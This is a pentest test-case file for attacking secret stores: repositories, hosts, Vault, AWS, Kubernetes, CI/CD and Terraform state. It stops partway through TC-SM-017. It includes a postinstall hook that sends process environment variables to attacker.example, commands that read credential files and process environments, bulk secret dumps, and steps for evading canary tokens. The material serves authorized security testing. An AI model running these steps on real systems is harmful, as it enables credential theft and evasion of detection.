# Secret Management Attack Test Cases

> Companion to `SKILL.md`, containing structured test cases TC-SM-001 through TC-SM-018 covering repository history sweep, filesystem scan, SAST custom rules, mobile APK extraction, web crawl, HashiCorp Vault exploitation, cloud secret manager abuse, CI/CD pipeline secret theft, Kubernetes secret dump, container image layer analysis, secret verification workflow, full lifecycle audit, Terraform state extraction, CI/CD inventory enumeration, custom gitleaks ruleset validation, semgrep dataflow rule tuning, and Jenkins credentials binding audit.
>
> All commands assume lawful authorization, signed scope-of-work, and explicit per-test client approval before any live API verification. Verification of credentials against provider endpoints is an OPSEC event.

---

## Statistics

| Category | Count | Severity Range |
|------|------|-----------|
| A. Discovery & Scanning | 4 | MEDIUM - CRITICAL |
| B. Secrets-Management Platform | 3 | HIGH - CRITICAL |
| C. CI/CD & Container | 3 | HIGH - CRITICAL |
| D. Verification & OPSEC | 2 | MEDIUM - HIGH |
| E. CI/CD Sprawl & SAST Rule Authoring | 6 | MEDIUM - CRITICAL |
| **Total** | **18** | **MEDIUM - CRITICAL** |

---

## A. Discovery & Scanning

### TC-SM-001: Repository History Secret Sweep (Local-Only OPSEC)

| Field | Value |
|------|-----|
| **ID** | TC-SM-001 |
| **Name** | Repository History Secret Sweep (Local-Only) |
| **Prerequisites** | Signed SOW naming the specific repository; read access to the repo (or anonymous clone URL if public); gitleaks ≥ 8.18 and trufflehog ≥ 3.70 installed; tmpfs or encrypted working directory for cloned bare repo and findings. |
| **Objective** | Discover every secret embedded in a repository's full git history (all branches, tags, dangling commits) without triggering provider-side secret-scanning alerts. Validates coverage of "deleted" secrets that remain in pack files. |
| **Tools** | gitleaks, trufflehog, git |
| **Steps** | 1. Mirror-clone the target repo locally: `git clone --mirror <repo_url> repo-bare` (mirror clone preserves all refs including dangling commits)<br>2. Run gitleaks against all refs: `cd repo-bare && gitleaks detect --source . --report-path gitleaks.json --log-opts=" --all" --redact`<br>3. Run trufflehog without verification (OPSEC-safe): `trufflehog git file://repo-bare --no-verification --no-update --json > trufflehog_unverified.jsonl`<br>4. Dedupe findings across both scanners by secret value hash<br>5. Manual review of unique candidates; classify by apparent provider (AWS, GitHub, Vault, etc.) and review the surrounding commit context |
| **Expected Result** | JSON/SARIF report enumerating each unique secret candidate with file, commit SHA, line number, rule matched, and redacted secret preview. No outbound API calls made. |
| **Cleanup** | `rm -rf repo-bare gitleaks.json trufflehog_unverified.jsonl` (or move to encrypted vault per engagement retention policy) |
| **References** | SKILL.md §Practical Steps Exercise 1; payloads.md §1.2, §2.2, §16.1 |

### TC-SM-002: Filesystem Hardcoded-Credential Sweep

| Field | Value |
|------|-----|
| **ID** | TC-SM-002 |
| **Name** | Filesystem Hardcoded-Credential Sweep |
| **Prerequisites** | Active foothold on the in-scope host (SSH session, popped shell, or agent beacon); gitleaks + trufflehog binaries uploaded or available; sudo/root or equivalent for reading `/root`, `/etc/shadow*`, and process environments of other users; client approval to read all in-scope file paths. |
| **Objective** | From a foothold on a compromised host, enumerate plaintext credentials in common locations: `.env`, `~/.aws/credentials`, `~/.kube/config`, `~/.docker/config.json`, `~/.npmrc`, `~/.pypirc`, `~/.netrc`, IDE workspace state, shell history, and log files. |
| **Tools** | gitleaks (--no-git), trufflehog filesystem, grep |
| **Steps** | 1. Inventory target directories: `for d in /home /etc /opt /var/log /root /srv /usr/local; do ls -la $d; done`<br>2. Run gitleaks without git: `gitleaks detect --source /target --no-git --report-path fs_leaks.json`<br>3. Run trufflehog filesystem: `trufflehog filesystem /target --json > fs_th.jsonl`<br>4. Manual grep for known credential file paths: `find /target -name "*.env" -o -name "credentials" -o -name ".npmrc" -o -name ".netrc" -o -name "kubeconfig" 2>/dev/null`<br>5. Extract and decode any base64-encoded blobs in config files<br>6. Check process environments for in-memory secrets: `for pid in $(pgrep -f service); do cat /proc/$pid/environ | tr '\0' '\n'; done` |
| **Expected Result** | Catalog of every plaintext credential on the host with file path, line, redacted value, and owner. |
| **Cleanup** | `shred -u fs_leaks.json fs_th.jsonl` after extracting masked findings into report. Never write raw secrets to long-term storage. |
| **References** | SKILL.md §Practical Steps Exercise 1; payloads.md §1.3, §2.4 |

### TC-SM-003: SAST Custom-Rule Proprietary Secret Audit

| Field | Value |
|------|-----|
| **ID** | TC-SM-003 |
| **Name** | SAST Custom-Rule Proprietary Secret Audit |
| **Prerequisites** | 10-20 sample proprietary secrets in the client's format (sanitized — never production values); labeled validation set of 40 entries (20 positive, 10 negative placeholders, 10 near-miss); semgrep ≥ 1.60 and bearer ≥ 1.40 installed; a sandbox repo for planting samples; an internal ticket or SOW amendment authoring custom rules. |
| **Objective** | Author custom semgrep + bearer rules that match the client's proprietary token formats (internal API keys, bespoke auth schemes, custom JWT signatures) that off-the-shelf scanners miss. |
| **Tools** | semgrep, bearer, jq |
| **Steps** | 1. Gather 10-20 sample proprietary secrets from the client (sample only — never production values)<br>2. Identify the canonical format (prefix, length, charset, entropy)<br>3. Write a semgrep rule in `custom_secrets.yml` (see SKILL.md §Practical Steps Exercise 2 for template)<br>4. Add allowlist patterns for example/test/placeholder values<br>5. Run scan: `semgrep --config custom_secrets.yml . --json -o findings.json`<br>6. Tune false-positive rate: aim for >90% precision on a labeled validation set<br>7. Add dataflow rule to detect secret-to-sink flow (e.g., `secret → console.log`)<br>8. Add bearer custom rule for the same pattern as cross-check |
| **Expected Result** | Tuned ruleset finding 90%+ of planted proprietary secrets with <10% false-positive rate in validation set. Dataflow rules surface insecure handling paths. |
| **Cleanup** | Remove sample secrets from validation environment. Do NOT commit the ruleset with sample values to a public repo. |
| **References** | SKILL.md §Practical Steps Exercise 2; payloads.md §3.3, §3.4, §4.3 |

### TC-SM-004: Mobile APK Secret Extraction

| Field | Value |
|------|-----|
| **ID** | TC-SM-004 |
| **Name** | Mobile APK Secret Extraction |
| **Prerequisites** | The production APK file (Play Store pull via `apk-mitm`, vendor-provided, or device-extracted); apkleaks, trufflehog, jadx, and apktool installed; Java 11+ runtime for jadx; explicit authorization to disassemble and reverse the client-owned mobile binary. |
| **Objective** | Extract every embedded secret from a production Android APK: API keys, Firebase config, OAuth client secrets, hardcoded backend URLs, and BuildConfig values. |
| **Tools** | apkleaks, trufflehog filesystem, jadx, apktool |
| **Steps** | 1. Obtain the APK (Play Store pull via `apk-mitm`, vendor-provided, or extracted from device)<br>2. Run apkleaks: `apkleaks -f app.apk -o apkleaks.json`<br>3. Extract DEX: `unzip -p app.apk classes.dex > classes.dex`<br>4. Run trufflehog on extracted DEX: `trufflehog filesystem --json . > apk_th.jsonl`<br>5. Decompile with jadx: `jadx -d app_src app.apk`<br>6. Grep for hardcoded values: `grep -rE "BuildConfig\.(API_KEY|SECRET)|google_api_key|firebase_url" app_src/`<br>7. Check for leaked `google-services.json` / Firebase config: `unzip -p app.apk assets/google-services.xml`<br>8. Probe any Firebase URLs for open rules: `curl https://<project>.firebaseio.com/.json` |
| **Expected Result** | Catalog of all secrets embedded in the APK with file/class location, type, and verification status. |
| **Cleanup** | `rm -rf app_src app.apk.extracted classes.dex apkleaks.json apk_th.jsonl` |
| **References** | SKILL.md §Practical Steps Exercise 8; payloads.md §5 |

---

## B. Secrets-Management Platform

### TC-SM-005: Web App JavaScript Secret Crawl

| Field | Value |
|------|-----|
| **ID** | TC-SM-005 |
| **Name** | Web App JavaScript Secret Crawl |
| **Prerequisites** | The target web app URL in scope; cariddi and katana installed; a clean egress IP not previously flagged by the target's WAF/CDN; client approval for active crawl with `-d 3` depth and known user-agent; OPSEC note that the crawl is visible in target access logs. |
| **Objective** | Crawl a target web application, extract inline secrets from JavaScript bundles, sourcemaps, and HTML comments, and identify forgotten debug endpoints leaking tokens. |
| **Tools** | cariddi, katana, curl, jq, grep |
| **Steps** | 1. Crawl with cariddi: `cariddi -u https://app.target.com -e -s -d 3 -timeout 10 -json -o cariddi.json`<br>2. Alternative crawl with katana for JS coverage: `katana -u https://app.target.com -jc -d 3 \| grep "\.js$" > js_urls.txt`<br>3. Download each JS bundle: `for url in $(cat js_urls.txt); do curl -s "$url" >> bundle.js; done`<br>4. Extract secrets with regex: `grep -oE "(AKIA[0-9A-Z]{16}\|sk_live_[A-Za-z0-9]{24,}\|ghp_[A-Za-z0-9]{36}\|AIza[0-9A-Za-z_\-]{35}\|xox[bao]-[A-Za-z0-9-]+)" bundle.js \| sort -u`<br>5. Check for sourcemaps exposing original source paths: `curl -s https://app.target.com/bundle.js.map \| jq .sources`<br>6. Look for hidden debug endpoints in JS: `grep -oE "/(debug\|admin\|internal\|test)/[a-z]+" bundle.js \| sort -u`<br>7. Verify each candidate (with OPSEC awareness — see TC-SM-011) |
| **Expected Result** | List of all secrets extracted from client-side JS, with source bundle URL, line, and verification status. |
| **Cleanup** | `rm -f bundle.js cariddi.json js_urls.txt` |
| **References** | SKILL.md §Practical Steps Exercise 9; payloads.md §6 |

### TC-SM-006: HashiCorp Vault Token Capabilities Abuse

| Field | Value |
|------|-----|
| **ID** | TC-SM-006 |
| **Name** | HashiCorp Vault Token Capabilities Abuse |
| **Prerequisites** | Active foothold on a host running a Vault agent sidecar (or any host where `VAULT_TOKEN` is set); network reachability to the Vault API (`VAULT_ADDR`); the token must not yet be expired or revoked; explicit client authorization to perform read-only enumeration against the production Vault (note: every `vault kv get` is an audit-device event). |
| **Objective** | From a foothold on a host with a Vault agent sidecar token, enumerate every secret path the token can read without revoking the token (OPSEC preservation). Demonstrate blast radius. |
| **Tools** | HashiCorp Vault CLI, jq, find |
| **Steps** | 1. Discover the token: check `~/.vault-token`, `env \| grep VAULT`, `/etc/vault.d/*`, process environments via `/proc/<pid>/environ`<br>2. Token introspection: `vault token lookup`<br>3. Enumerate policies: `vault token lookup -format=json \| jq .data.policies`<br>4. Capabilities check across common paths: `for p in secret/ secret/data/ kv/ prod/ staging/ pki/ database/ aws/; do vault token capabilities $p; done`<br>5. Recursive secret walker (see payloads.md §9.3): harvest every secret at every reachable path<br>6. Pivot-graph: for each harvested secret (RDS password, AWS key), enumerate downstream access<br>7. OPSEC: do NOT revoke the token; do NOT make bulk reads in a tight window (spread over time) |
| **Expected Result** | Complete blast-radius map: token → policies → reachable paths → each secret's downstream access. No token revocation, no audit anomalies. |
| **Cleanup** | `shred -u vault_harvest.json`. Coordinate with client on token rotation AFTER engagement ends. |
| **References** | SKILL.md §Practical Steps Exercise 3; payloads.md §9 |

### TC-SM-007: AWS Secrets Manager Blast-Radius Enumeration

| Field | Value |
|------|-----|
| **ID** | TC-SM-007 |
| **Name** | AWS Secrets Manager Blast-Radius Enumeration |
| **Prerequisites** | A verified AWS access key (long-lived or STS) confirmed active via TC-SM-011; aws-cli ≥ 2.13 with the key configured; per-test approval for CloudTrail-logged `GetSecretValue` calls; documented verification budget (max N reads per day); pre-coordinated rotation plan with client for any verified secrets discovered. |
| **Objective** | From a verified AWS access key (TC-SM-011), enumerate and read every secret in AWS Secrets Manager and SSM Parameter Store the key can access. Quantify blast radius. |
| **Tools** | aws-cli, jq |
| **Steps** | 1. Lightest-touch identity check: `aws sts get-caller-identity` (this is logged in CloudTrail but does not modify state)<br>2. Enumerate regions: `for region in us-east-1 us-west-2 eu-west-1 ap-southeast-2; do aws secretsmanager list-secrets --region $region --output json > secrets_${region}.json; done`<br>3. Read each secret (CloudTrail data event — OPSEC-sensitive): `for arn in $(jq -r '.SecretList[].ARN' secrets_us-east-1.json); do aws secretsmanager get-secret-value --secret-id "$arn" --region us-east-1 --query 'SecretString' --output text >> harvested.jsonl; done`<br>4. SSM Parameter Store enumeration: `aws ssm describe-parameters --output json > ssm.json`<br>5. Decrypt SecureString parameters: `for n in $(jq -r '.Parameters[].Name' ssm.json); do aws ssm get-parameter --name "$n" --with-decryption --query 'Parameter.Value' --output text; done`<br>6. Pivot-graph: for each harvested DB credential, attempt RDS auth; for each AWS key, run STS GetCallerIdentity<br>7. Quantify blast radius: count of secrets × downstream services reachable |
| **Expected Result** | Catalog of every readable secret with ARN, region, value, type, and downstream pivot potential. CloudTrail events logged (expected). |
| **Cleanup** | `shred -u harvested.jsonl secrets_*.json ssm.json`. Document every CloudTrail event for the post-engagement report. |
| **References** | SKILL.md §Practical Steps Exercise 4; payloads.md §8.3, §10.3 |

---

## C. CI/CD & Container

### TC-SM-008: CI/CD Pipeline Secret Theft (GitHub Actions)

| Field | Value |
|------|-----|
| **ID** | TC-SM-008 |
| **Name** | CI/CD Pipeline Secret Theft via `pull_request_target` |
| **Prerequisites** | A sandbox GitHub repo owned by the engagement team (NEVER the client's production repo) with at least one secret configured; a second GitHub account that has forked the sandbox repo; explicit approval in the SOW for PoC demonstration in the sandbox only; coordination with client on the expected PR pattern so they can identify it in audit logs. |
| **Objective** | Demonstrate how a misconfigured GitHub Actions workflow using `pull_request_target` with `secrets.*` exposes repository secrets to attackers who open a fork-PR. Reference real CVEs: `tj-actions/changed-files` (2025), Codecov supply chain (2021). |
| **Tools** | gh (GitHub CLI), git, GitHub Actions |
| **Steps** | 1. Review target workflow YAML for `on: pull_request_target` with `secrets.*` usage<br>2. Identify the specific pattern: `with: ref: ${{ github.event.pull_request.head.sha }}` + downstream `secrets.X`<br>3. Demonstrate in a sandbox fork: create a fork, modify `package.json` to exfil env vars in postinstall: `"scripts": {"postinstall": "curl -d @- https://attacker.example/ < /proc/self/environ \|\| true"}`<br>4. Open a PR; observe workflow execution exfiltrating `PROD_DEPLOY_KEY`<br>5. Document the proof-of-concept in the report<br>6. Provide remediation: never use `pull_request_target` with secrets; use `pull_request` instead, OR add a label-gate job that re-checks-out the base branch |
| **Expected Result** | PoC demonstrating that a fork-PR can read repository secrets via `pull_request_target`. Workflow YAML, attack PR diff, and remediation guidance. |
| **Cleanup** | Close the PoC PR; rotate any exfiltrated sandbox secrets; confirm workflow remediation. |
| **References** | SKILL.md §Practical Steps Exercise 5; payloads.md §11.1, §11.7 |

### TC-SM-009: Kubernetes Secret Dump Across Namespaces

| Field | Value |
|------|-----|
| **ID** | TC-SM-009 |
| **Name** | Kubernetes Secret Dump Across Namespaces |
| **Prerequisites** | Active foothold with a Kubernetes Service Account token (extracted from a pod, sidecar, or harvested kubeconfig); the SA must have at minimum `get/list secrets` in one or more namespaces; network reachability to the Kubernetes API server; kubectl installed and configured; explicit authorization to enumerate every namespace in scope (cluster-wide enumeration requires additional approval). |
| **Objective** | From a foothold with a compromised Service Account token, enumerate and dump every secret in every namespace the SA can reach. Pivot to cluster-admin if RBAC allows via CSR creation. |
| **Tools** | kubectl, jq, etcdctl, peirates |
| **Steps** | 1. Identify SA capabilities: `kubectl auth can-i --list`<br>2. Check critical capabilities: `kubectl auth can-i get secrets -A; kubectl auth can-i get secrets -n kube-system; kubectl auth can-i create csr`<br>3. Dump all secrets: `kubectl get secrets -A -o json \| jq '.items[] \| {ns: .metadata.namespace, name: .metadata.name, type: .type, data: (.data \| to_entries \| map({key: .key, value: (.value \| @base64d)}))}'`<br>4. Extract ImagePullSecrets for private registry creds: `kubectl get secrets -A -o json \| jq '.items[] \| select(.type=="kubernetes.io/dockerconfigjson") \| {auths: (.data[".dockerconfigjson"] \| @base64d \| fromjson).auths}'`<br>5. Extract Service Account JWTs: `kubectl get secrets -A -o json \| jq '.items[] \| select(.type=="kubernetes.io/service-account-token") \| .data.token' \| tr -d '"' \| base64 -d`<br>6. If RBAC allows CSR: pivot to cluster-admin via TLS bootstrap (payloads.md §12.6)<br>7. If you can reach etcd directly: snapshot extraction via `etcdctl snapshot save` (payloads.md §12.5) |
| **Expected Result** | Complete secret catalog across all accessible namespaces, decoded values, imagePullSecrets, SA JWTs, and (if applicable) cluster-admin pivot proof. |
| **Cleanup** | `shred -u secrets_dump.json sa_tokens.txt`. Coordinate cluster rotation after engagement. |
| **References** | SKILL.md §Practical Steps Exercise 6; payloads.md §12 |

### TC-SM-010: Container Image Layer Analysis

| Field | Value |
|------|-----|
| **ID** | TC-SM-010 |
| **Name** | Container Image Layer Analysis for Hidden Secrets |
| **Prerequisites** | The image reference (e.g., `registry.client/api:2024.11`) and registry credentials if the registry is private; docker daemon ≥ 24.0 or podman ≥ 4.0 with pull access; dive, trivy, and grype installed; sufficient disk space for `docker save` (typically 2-5× image size); explicit authorization to pull and disassemble every layer. |
| **Objective** | Walk every layer of a Docker image to find secrets baked into base or intermediate layers even when "deleted" in later layers. Use dive + trivy + manual tar extraction. |
| **Tools** | dive, trivy, grype, docker, tar, grep |
| **Steps** | 1. Pull the image: `docker pull <image_ref>`<br>2. Interactive layer walk: `dive <image_ref>` — inspect each layer's added/modified files<br>3. Automated secret scan: `trivy image --scanners secret --format json <image_ref> -o trivy.json`<br>4. Manual: save image to tar: `docker save <image_ref> -o image.tar && mkdir image && tar xf image.tar -C image`<br>5. For each layer: `for layer in image/*/layer.tar; do echo "=== $layer ==="; tar tvf "$layer" \| grep -E '(\.env\|credentials\|\.key\|\.pem\|config\.json\|\.npmrc\|\.pypirc\|\.netrc\|\.kube/config)'; done`<br>6. Extract interesting files from specific layers: `tar xvf image/<hash>/layer.tar etc/.env`<br>7. Cross-reference with syft/grype SBOM to confirm provenance<br>8. Document findings with layer hash, file path, secret type, and which "delete" layer tried to remove it |
| **Expected Result** | Catalog of every secret embedded in any layer, with layer hash and the (failed) delete attempt location. |
| **Cleanup** | `rm -rf image image.tar trivy.json`. |
| **References** | SKILL.md §Practical Steps Exercise 7; payloads.md §13 |

---

## D. Verification & OPSEC

### TC-SM-011: Secret Verification Workflow with Canary-Token Evasion

| Field | Value |
|------|-----|
| **ID** | TC-SM-011 |
| **Name** | Secret Verification Workflow with Canary-Token Evasion |
| **Prerequisites** | The candidate secret(s) to verify (output of TC-SM-001 through TC-SM-010); trufflehog ≥ 3.70 with `--only-verified` capability; curl with TLS 1.2+; a clean egress IP not previously associated with attacker activity; per-test client approval for each live verification; documented verification budget (max N verifications per day); a "canary-token detector" script or set of heuristics covering thinkst, GitGuardian, and known AWS honey-key account IDs. |
| **Objective** | Establish a safe verification workflow that distinguishes real secrets from canary tokens / honeytokens before any live API call. Prevent triggering defender alerting from thinkst, GitGuardian, or custom AWS honey keys. |
| **Tools** | trufflehog (--only-verified), curl, custom heuristics |
| **Steps** | 1. Heuristic pre-check on every candidate: context grep for `(canary\|honey\|example\|test\|token\|decoy)` in surrounding lines<br>2. Format validation: regex match against known provider formats (payloads.md §15.1)<br>3. Local entropy check: Shannon entropy > 4.5 on base64-ish string<br>4. Local context check: file type (README vs production code), commit age (older = more likely real but possibly rotated), committer (internal vs external)<br>5. AWS honey-key account check: known honeypot account IDs (123456789012, 111111111111, etc.)<br>6. thinkst domain check: `grep -rE "canarytokens\.(com\|org)"`<br>7. ONLY after heuristics pass: trufflehog `--only-verified` or manual lightest-touch call (STS GetCallerIdentity for AWS, `GET /user` for GitHub PAT)<br>8. Document verification as an OPSEC event with timestamp, IP used, provider response code |
| **Expected Result** | Verified-secrets list with documented heuristics applied and OPSEC events logged. Zero unintended honeytoken triggers. |
| **Cleanup** | Record all verification events for client audit trail. Recommend rotation of all verified secrets regardless. |
| **References** | SKILL.md §Methodology Phase 3; payloads.md §14, §16 |

### TC-SM-012: Full Lifecycle Audit and Blast-Radius Report

| Field | Value |
|------|-----|
| **ID** | TC-SM-012 |
| **Name** | Full Lifecycle Audit and Blast-Radius Report Assembly |
| **Prerequisites** | All TC-SM-001 through TC-SM-011 prerequisites satisfied for the in-scope target set; a populated `secret_targets.tsv` inventory; defined OPSEC budget for the engagement; pre-agreed verification approval matrix (what gets verified live vs documented as unverified); client contact for rotation coordination; report template loaded and ready. |
| **Objective** | Execute the complete six-phase methodology end-to-end: scope → breadth scan → triage/verify → platform exploit → lateral pivot → report. Produce a deliverable mapping every verified secret to its blast radius and rotation status. |
| **Tools** | gitleaks, trufflehog, semgrep, bearer, apkleaks, cariddi, dive, trivy, vault CLI, aws-cli, kubectl, jq |
| **Steps** | 1. Phase 1 — Scope & Inventory: define targets (repos, hosts, images, APKs, web apps, cloud, vault, CI, K8s); set OPSEC limits (no live verification without approval, max verification budget per day)<br>2. Phase 2 — Breadth Scan: run gitleaks + trufflehog (unverified) + semgrep + bearer + apkleaks + cariddi + dive + trivy against every applicable target<br>3. Phase 3 — Triage & Verify: dedupe, filter false positives, rank by blast radius, apply canary-token heuristics, verify ONLY high-confidence candidates with explicit approval<br>4. Phase 4 — Platform Exploit: for each verified secret, expand to its native platform (Vault enumeration, AWS Secrets Manager dump, K8s secret dump, CI variable extraction)<br>5. Phase 5 — Lateral Pivot: maintain a pivot graph; each harvested secret expands reachable nodes; record every pivot<br>6. Phase 6 — Report: blast-radius graph (mermaid diagram), rotation-status table, severity classification, recommendations |
| **Expected Result** | Comprehensive deliverable: findings table with masked secrets, blast-radius graph, rotation status (rotated / pending / refused), severity distribution, and prioritized remediation recommendations. |
| **Cleanup** | `shred -u` all working files; encrypt final deliverable at rest; coordinate post-engagement rotation ceremony with client. |
| **References** | SKILL.md §Methodology; payloads.md §17 |

---

## E. CI/CD Sprawl & SAST Rule Authoring

### TC-SM-013: Terraform State File Secret Extraction

| Field | Value |
|------|-----|
| **ID** | TC-SM-013 |
| **Name** | Terraform State File Secret Extraction |
| **Prerequisites** | Access to one or more `.tfstate` / `.tfstate.backup` files (in-repo, in S3 backend, or in Terraform Cloud via the state-versions API); gitleaks ≥ 8.18 (native `.tfstate` support); `jq` for structured extraction; per-test approval for S3 backend reads if state lives in a remote bucket; understanding of which Terraform providers are in use (AWS, GCP, Azure, Kubernetes, TLS, GitHub, etc.) — affects which attribute paths to inspect. |
| **Objective** | Extract every secret-bearing attribute from Terraform state files. State files persist resolved values of resources like `aws_db_instance.password`, `kubernetes_secret.data`, `tls_private_key.private_key_pem`, and `github_token.token` — even when those attributes are marked `sensitive = true` in HCL, the resolved value is written to state in plaintext. |
| **Tools** | gitleaks (--no-git), jq, aws-cli (for S3 backends), curl (for TFC API) |
| **Steps** | 1. Locate state files: `find . -name '*.tfstate' -o -name '*.tfstate.backup' > tfstate_files.txt`<br>2. If S3 backend in use: `aws s3 ls --recursive s3://REPLACE_WITH_STATE_BUCKET/ \| grep -E '\.tfstate' > s3_tfstate.txt`<br>3. If TFC: `curl -H "Authorization: Bearer ${TFC_TOKEN}" https://app.terraform.io/api/v2/workspaces/${WS}/current-state-version \| jq -r '.data.attributes."hosted-state-download-url'"` then download the pre-signed URL<br>4. gitleaks scan (native tfstate support): `gitleaks detect --source . --no-git --include-paths='\.tfstate$' --report-path tfstate_leaks.json`<br>5. jq extraction of common secret attributes: `jq -r '.. \| strings \| select(test("password\|secret\|token\|api_key\|private_key"; "i"))' *.tfstate`<br>6. Provider-specific deep dives (per payloads.md §8 / guides/cicd-secret-sprawl-and-sast-rule-deep-dive.md §8.3): AWS RDS password, Kubernetes secret data (base64-decode), TLS private keys, GitHub tokens<br>7. Build a state-file → secret blast-radius map: which workspace produced the state, which cloud account does it deploy to, what downstream systems does each extracted secret reach |
| **Expected Result** | Catalog of every secret extracted from every in-scope state file, with the producing Terraform workspace, the resource type and attribute name, the provider, and the downstream access each secret grants. |
| **Cleanup** | `shred -u tfstate_leaks.json s3_tfstate.txt tfstate_files.txt`. Treat extracted secrets as production secrets — coordinate rotation with the workspace owner. |
| **References** | guides/cicd-secret-sprawl-and-sast-rule-deep-dive.md §8; payloads.md §8 |

### TC-SM-014: CI/CD Multi-Provider Inventory Enumeration

| Field | Value |
|------|-----|
| **ID** | TC-SM-014 |
| **Name** | CI/CD Multi-Provider Inventory Enumeration |
| **Prerequisites** | Valid API tokens for every CI/CD provider in scope: GitHub PAT with `read:org` (or GitHub App installation token), GitLab PAT with `api` scope, Jenkins admin credentials (or per-folder read credentials), CircleCI API token with `view-api` scope, optional Argo CD / Tekton / Terraform Cloud tokens as applicable; explicit SOW authorization for CI/CD inventory across the named orgs/groups/projects; rate-limit awareness (start with `per_page=100` and 1-2s stagger between calls). |
| **Objective** | Build a complete inventory of every CI/CD pipeline, workflow, job, and secret reference across every provider in scope. Output a unified TSV (`provider, repo_or_project, workflow_file, branch, last_commit_at, owner_team, notes`) consumed by downstream heat-map reporting. This is the foundational step for TC-SM-015 and TC-SM-018. |
| **Tools** | gh (GitHub CLI), curl + jq, Bash |
| **Steps** | 1. GitHub Actions inventory: `gh repo list REPLACE_WITH_YOUR_ORG --limit 1000 --json nameWithOwner,visibility,defaultBranchRef` then per-repo check for `.github/workflows/*`<br>2. GitLab CI inventory: `curl -H "PRIVATE-TOKEN: ${GL_TOKEN}" "https://${GITLAB_HOST}/api/v4/groups/.../projects?per_page=100&include_subgroups=true"` then per-project check for `.gitlab-ci.yml`<br>3. Jenkins inventory: `curl -u "${JENKINS_USER}:${JENKINS_TOKEN}" "${JENKINS_URL}/api/json?tree=jobs[name,url,color,jobs[...]]"` (recursive folder traversal)<br>4. CircleCI inventory: `curl -H "Circle-Token: ${CCI_TOKEN}" "https://circleci.com/api/v2/pipeline?org-slug=gh/..."` and `/context?owner-slug=...`<br>5. Terraform Cloud: `curl -H "Authorization: Bearer ${TFC_TOKEN}" https://app.terraform.io/api/v2/organizations/${ORG}/workspaces`<br>6. Merge into a unified `cicd_inventory.tsv` with consistent columns<br>7. Heat map summary: count of workflows per provider, count of `secrets.*` references, distribution by owner team |
| **Expected Result** | Unified inventory TSV covering every provider, every in-scope repo/project/workspace, every workflow file, every referenced secret, and every owning team. |
| **Cleanup** | `shred -u` all per-provider intermediate files; the final inventory is the engagement deliverable's appendix. |
| **References** | guides/cicd-secret-sprawl-and-sast-rule-deep-dive.md §3; payloads.md §11.8 |

### TC-SM-015: Custom gitleaks Ruleset Validation

| Field | Value |
|------|-----|
| **ID** | TC-SM-015 |
| **Name** | Custom gitleaks Ruleset Precision/Recall Validation |
| **Prerequisites** | A custom gitleaks config (e.g., `custom_gitleaks.json`) covering the client's proprietary token format; a labeled validation set of 40 entries (20 positive samples matching the client's real format, 10 negative placeholders like `example` / `test` / `REPLACE_WITH`, 10 near-miss non-secret strings); a sandbox directory for planting samples; gitleaks ≥ 8.18 with entropy support; an internal tracking ticket documenting the validation results for hand-off to the client. |
| **Objective** | Quantitatively validate the custom gitleaks ruleset achieves ≥ 90% precision and ≥ 90% recall on the labeled validation set before shipping to CI. Compute precision, recall, F1 score, and false-positive rate. Iterate the ruleset until all four metrics clear the acceptance threshold. |
| **Tools** | gitleaks, jq, awk, Bash |
| **Steps** | 1. Build the 40-entry validation set per §12.1 of the deep-dive guide (20 positive, 10 negative, 10 near-miss)<br>2. Run gitleaks: `gitleaks detect --source validation/ --config custom_gitleaks.json --no-git --report-path findings.json`<br>3. Compute true positives: `tp=$(jq '[.[] \| select(.File \| test("positive_"))] \| length' findings.json)`<br>4. Compute false positives: `fp=$(jq '[.[] \| select(.File \| test("negative_"))] \| length' findings.json)`<br>5. Compute precision: `awk "BEGIN {printf \"%.1f\", ${tp} / (${tp} + ${fp}) * 100}"`<br>6. Compute recall: `awk "BEGIN {printf \"%.1f\", ${tp} / 20 * 100}"` (20 = total positives)<br>7. If precision < 90%: identify top false-positive patterns; add to `allowlist.regexes` OR tighten `regex`<br>8. If recall < 90%: identify top false-negative patterns; loosen `regex` OR add second rule variant<br>9. Re-run; iterate until precision ≥ 95% AND recall ≥ 95%<br>10. Document final metrics in `precision_recall.md` for client hand-off |
| **Expected Result** | Documented precision/recall/F1/false-positive-rate numbers showing the ruleset meets the 95%/95% target, with iteration history and the final ruleset file ready for CI integration. |
| **Cleanup** | `rm -rf validation/` (contains only synthetic samples — safe to discard). Preserve `custom_gitleaks.json` and `precision_recall.md` for client hand-off. |
| **References** | guides/cicd-secret-sprawl-and-sast-rule-deep-dive.md §9, §12; payloads.md §1.4, §15.4 |

### TC-SM-016: semgrep Dataflow Rule for Secret-to-Sink Tracking

| Field | Value |
|------|-----|
| **ID** | TC-SM-016 |
| **Name** | semgrep Taint-Mode Rule for Secret-to-Sink Tracking |
| **Prerequisites** | semgrep ≥ 1.60 installed; the client codebase checked out locally; a target sink class identified for the engagement (typical: `console.log`, `console.error`, `print()`, `logger.info`, `requests.post(url, data=...)`, `fetch(url, {body: ...})`, `File.writeFile`); a sample of the client's source-of-secret patterns (e.g., `const X = process.env.Y`, `os.Getenv("Y")`, `System.getenv("Y")`); authorization to run SAST across the entire codebase (note: SAST is read-only — no OPSEC impact). |
| **Objective** | Author and validate a semgrep taint-mode rule that tracks a secret value from its source (env var read, request body parameter) to a sink (logging function, external HTTP call, file write). Catches the architectural pattern that leaks secrets at runtime even when no static secret is hardcoded. |
| **Tools** | semgrep, jq |
| **Steps** | 1. Identify the source pattern(s) — e.g., `const $SECRET = process.env.SECRET` (JS), `$SECRET = os.environ["SECRET"]` (Python)<br>2. Identify the sink pattern(s) — e.g., `console.log($S)`, `print($S)`, `logger.info($S)`<br>3. Author the rule in `secret_to_sink.yml` (see deep-dive guide §10.3 for full template)<br>4. Set `mode: taint` and define `pattern-sources` + `pattern-sinks`<br>5. Run: `semgrep --config secret_to_sink.yml . --json -o findings.json`<br>6. Validate on a known-leaky test file: write a sample `leak.js` with `const T = process.env.TOKEN; console.log(T);` and confirm the rule fires<br>7. Run on the full codebase; review the top 10 findings manually for true-positive confirmation<br>8. Add `pattern-not-regex` allowlist for any legitimate logging (e.g., redacted/masked values logged intentionally)<br>9. Tune until false-positive rate is < 10% on a random sample of 50 findings |
| **Expected Result** | A working semgrep taint-mode rule that finds secret-to-sink flows in the codebase, with documented precision on a labeled sample and integration instructions for CI. |
| **Cleanup** | `rm -f leak.js findings.json`. Preserve `secret_to_sink.yml` for client hand-off. |
| **References** | guides/cicd-secret-sprawl-and-sast-rule-deep-dive.md §10.3; payloads.md §3.4 |

### TC-SM-017: Jenkins Credentials Binding Audit

| Field | Value |
|------|-----|
| **ID** | TC-SM-017 |
| **Name** | Jenkins Credentials Binding Audit |
